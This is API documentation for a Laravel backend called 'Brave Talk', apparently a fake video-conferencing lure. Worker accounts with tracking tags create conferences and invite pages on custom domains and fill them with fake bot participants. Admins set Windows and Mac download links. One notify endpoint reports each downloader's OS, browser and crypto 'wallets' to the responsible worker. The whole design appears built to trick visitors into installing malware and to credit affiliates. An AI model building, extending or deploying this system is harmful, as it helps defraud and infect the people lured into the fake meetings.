# Brave Talk API Documentation

## Overview
This Laravel application provides a complete API for a video conferencing system with bots, workers, and invite pages.

## Database Structure

### Tables Created:
- `users` - Basic user authentication
- `conferences` - Video conferences with invite codes
- `bots` - Conference bots with avatars and settings
- `workers` - System workers with tags
- `invite_pages` - Landing pages for conference invitations
- `settings` - System settings (download links, etc.)
- `messages` - Conference chat messages
- `visits` - Track page visits
- `downloads` - Track download events

## API Endpoints

### 1. Authentication
**POST** `/api/auth/login`
```json
// Request Body:
{
  "token": "worker_tag_value"
}

// Response:
{
  "valid": true,
  "worker": {
    "id": "worker_id",
    "name": "Worker Name",
    "email": "worker@example.com",
    "tag": "worker_tag"
  }
}
```

### 2. Settings
**GET** `/api/settings/download-links`
```json
{
  "windows": "https://example.com/app-windows.exe",
  "mac": "https://example.com/app-mac.dmg"
}
```

### 3. Workers
**GET** `/api/workers/me` (Protected by Worker Token)
```json
{
  "worker": {
    "id": "worker_id",
    "name": "Worker Name",
    "email": "worker@example.com",
    "tag": "worker_tag"
  },
  "conferences": [
    {
      "id": "conference_id",
      "title": "Conference Title",
      "invite_code": "ABC123",
      "worker_tag": "worker_tag",
      "created_at": "2024-01-01T00:00:00Z"
    }
  ]
}
```

**GET** `/api/workers`
```json
[
  {
    "id": "worker_id",
    "name": "Worker Name",
    "email": "worker@example.com",
    "tag": "worker_tag",
    "created_at": "2024-01-01T00:00:00Z"
  }
]
```

### 4. Conferences

**GET** `/api/conferences` (Protected by Worker Token)
```json
{
  "conferences": [
    {
      "id": "conference_id",
      "title": "Conference Title",
      "invite_code": "ABC123",
      "worker_tag": "worker_tag",
      "created_at": "2024-01-01T00:00:00Z"
    }
  ]
}
```

**POST** `/api/conferences` (Protected by Worker Token)
```json
// Request Body:
{
  "title": "Conference Title",
  "domain": "example.com",
  "ref": "custom-ref"
}

// Response:
{
  "conference": {
    "id": "conference_id",
    "title": "Conference Title",
    "invite_code": "ABC123",
    "worker_tag": "worker_tag",
    "created_at": "2024-01-01T00:00:00Z"
  }
}
```

**DELETE** `/api/conferences/{id}` (Protected by Worker Token)
```json
{
  "success": true,
  "message": "Conference deleted"
}
```

**GET** `/api/conferences/{conferenceId}/members`
```json
{
  "bots": [
    {
      "id": "bot_id",
      "name": "Bot Name",
      "avatar": "avatar_url",
      "mic": true,
      "hand": false,
      "avatar_url": "avatar_url"
    }
  ],
  "guests": []
}
```

**POST** `/api/conferences/{conferenceId}/messages`
```json
// Request Body:
{
  "sender": "user_name",
  "text": "message_text",
  "time": "12:00"
}

// Response:
{
  "success": true,
  "message": "Message sent"
}
```

### 5. Bots

**GET** `/api/conferences/{conferenceId}/bots` (Protected by Worker Token)
```json
{
  "bots": [
    {
      "id": "bot_id",
      "name": "Bot Name",
      "avatar": "avatar_url",
      "mic": true,
      "hand": false,
      "avatar_url": "avatar_url"
    }
  ]
}
```

**POST** `/api/conferences/{conferenceId}/bots` (Protected by Worker Token)
```json
// Request Body (multipart/form-data):
{
  "name": "Bot Name",
  "avatar": "file_upload"
}

// Response:
{
  "bot": {
    "id": "bot_id",
    "name": "Bot Name",
    "avatar": "avatar_url",
    "mic": false,
    "hand": false,
    "avatar_url": "avatar_url"
  }
}
```

**DELETE** `/api/conferences/{conferenceId}/bots/{botId}` (Protected by Worker Token)
```json
{
  "success": true,
  "message": "Bot deleted"
}
```

**POST** `/api/conferences/{conferenceId}/bots/{botId}/send-message` (Protected by Worker Token)
```json
// Request Body:
{
  "text": "message_text"
}

// Response:
{
  "success": true,
  "message": "Message sent"
}
```

### 6. Conferences (Original)
**GET** `/api/conferences/{conferenceId}/worker-tag`
```json
{
  "tag": "worker_tag_value"
}
```

**POST** `/api/conferences/{conferenceId}/visit`
```json
{
  "success": true,
  "message": "Visit recorded"
}
```

**GET** `/api/conferences/{conferenceId}/messages`
```json
{
  "data": [
    {
      "id": "message_id",
      "sender": "sender_name",
      "text": "message_text",
      "created_at": "2024-01-01T12:00:00Z"
    }
  ]
}
```

**POST** `/api/conferences/{conferenceId}/download`
```json
{
  "success": true,
  "message": "Download recorded"
}
```

**GET** `/api/conferences/join/{inviteCode}`
```json
{
  "conference": {
    "id": "conference_id",
    "created_at": "2024-01-01T00:00:00Z",
    "bots": [
      {
        "id": "bot_id",
        "name": "Bot Name",
        "avatar": "avatar_url",
        "mic": true,
        "hand": false,
        "avatar_url": "avatar_url"
      }
    ],
    "guests": []
  }
}
```

**POST** `/api/conferences/join/{inviteCode}`
```json
// Request Body:
{
  "name": "user_name"
}

// Response:
{
  "conferenceId": "conference_id_value"
}
```

### 7. Invite Pages

**GET** `/api/invite-pages` (Protected by Worker Token)
```json
{
  "pages": [
    {
      "id": "page_id",
      "title": "Page Title",
      "ref": "page_ref",
      "conference_id": "conference_id",
      "worker_tag": "worker_tag",
      "created_at": "2024-01-01T00:00:00Z"
    }
  ]
}
```

**POST** `/api/invite-pages` (Protected by Worker Token)
```json
// Request Body:
{
  "title": "Page Title",
  "ref": "page_ref",
  "domain": "example.com"
}

// Response:
{
  "page": {
    "id": "page_id",
    "title": "Page Title",
    "ref": "page_ref",
    "conference_id": "conference_id",
    "worker_tag": "worker_tag",
    "created_at": "2024-01-01T00:00:00Z"
  }
}
```

**DELETE** `/api/invite-pages/{id}` (Protected by Worker Token)
```json
{
  "success": true,
  "message": "Page deleted"
}
```

### 8. Invite Pages (Original)
**GET** `/api/invite-pages/by-ref/{ref}/worker-tag`
```json
{
  "tag": "worker_tag_value"
}
```

**GET** `/api/invite-pages/by-ref/{ref}`
```json
{
  "page": {
    "id": "page_id",
    "conference_id": "conference_id",
    "ref": "invite_ref",
    "title": "Page Title"
  }
}
```

**POST** `/api/invite-pages/by-ref/{ref}/visit`
```json
{
  "success": true,
  "message": "Visit recorded"
}
```

**POST** `/api/invite-pages/by-ref/{ref}/download`
```json
{
  "success": true,
  "message": "Download recorded"
}
```

### 4. Notifications
**POST** `/api/notify/download`
```json
// Request Body:
{
  "ua": {
    "os": { "name": "Mac OS" },
    "browser": { "name": "Chrome" }
  },
  "wallets": ["wallet1", "wallet2"],
  "tag": "worker_tag",
  "land": "BraveTalk",
  "conferenceId": "conf_id"
}

// Response:
{
  "success": true,
  "message": "Notification sent"
}
```

### 5. Admin (Protected by Bearer Token)
**POST** `/api/admin/login`
```json
// Request Body:
{
  "token": "admin_token_value"
}

// Response:
{
  "success": true
}
```

**GET** `/api/admin/workers`
```json
[
  {
    "id": "worker_id",
    "name": "Worker Name",
    "email": "worker@example.com",
    "status": "active"
  }
]
```

**GET** `/api/admin/settings/download-links`
```json
{
  "windows": "https://example.com/app-windows.exe",
  "mac": "https://example.com/app-mac.dmg"
}
```

**POST** `/api/admin/settings/download-links`
```json
// Request Body:
{
  "windows": "new_windows_link",
  "mac": "new_mac_link"
}

// Response:
{
  "success": true,
  "message": "Links updated"
}
```

## Authentication

### Worker Authentication
- Worker endpoints require Bearer token authentication
- Token is the worker's `tag` field from the database
- Example: `Authorization: Bearer worker123`

### Admin Authentication  
- Admin endpoints require Bearer token authentication
- Token: `admin123` (configurable in .env as ADMIN_TOKEN)
- Example: `Authorization: Bearer admin123`

## Sample Data
The seeder creates:
- Sample conference with invite code: `sample123`
- Sample invite page with ref: `sample-ref`
- Sample worker with email: `worker@example.com`
- Default download links
- Sample bots for the conference

## Setup Instructions
1. Run migrations: `php artisan migrate`
2. Seed database: `php artisan db:seed`
3. Start server: `php artisan serve`
4. Access API at: `http://localhost:8000/api/`

## Frontend Integration
The frontend Vue.js application expects these exact API responses and will work seamlessly with this backend implementation.
